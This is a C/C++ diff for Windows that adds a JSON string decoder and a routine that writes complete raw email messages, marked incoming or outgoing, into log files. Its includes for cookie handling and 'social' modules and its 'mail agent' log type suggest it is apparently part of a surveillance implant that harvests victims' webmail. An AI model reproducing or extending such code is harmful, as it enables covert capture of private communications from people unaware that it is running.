@@ -6,9 +6,11 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 #include <windows.h>
 #include <stdio.h>
+#include <string>
 #include <time.h>
 #include "..\common.h"
 #include "..\LOG.h"
+#include "..\JSON\JSON.h"
 #include "..\bin_string.h"
 #include "CookieHandler.h"
 #include "SocialMain.h"
@@ -49,6 +51,22 @@ void urldecode(char *src)
 	*dest = 0;
 }
 
+void JsonDecode(char *string)
+{
+	WCHAR *string_16, *ptr;
+	DWORD size;
+	std::wstring decode_16=L"";
+
+	size = strlen(string);
+	ptr = string_16 = UTF8_2_UTF16(string);
+	if (!string_16) 
+		return;
+	JSON::ExtractString((const wchar_t **)&string_16, decode_16);
+	if (wcslen(decode_16.c_str())>0)
+		WideCharToMultiByte(CP_UTF8, 0, decode_16.c_str(), -1, string, size, 0 , 0);
+	SAFE_FREE(ptr);
+}
+
 void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming)
 {
 	HANDLE hf;
@@ -81,6 +99,28 @@ void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char 
 	Log_CloseFile(hf); 
 
 	SAFE_FREE(raw_mail);
+	return;
+}
+
+void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming)
+{
+	HANDLE hf;
+	struct MailSerializedMessageHeader additional_header;
+	
+	ZeroMemory(&additional_header, sizeof(additional_header));
+	additional_header.Size = size;
+	additional_header.Flags |= MAIL_FULL_BODY;
+	if (is_incoming)
+		additional_header.Flags |= MAIL_INCOMING;
+	else
+		additional_header.Flags |= MAIL_OUTGOING;
+	additional_header.Program = program;
+	additional_header.VersionFlags = MAPI_V3_0_PROTO;
+
+	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
+	Log_WriteFile(hf, (BYTE *)raw_mail, additional_header.Size);
+	Log_CloseFile(hf); 
+
 	return;
 }
 
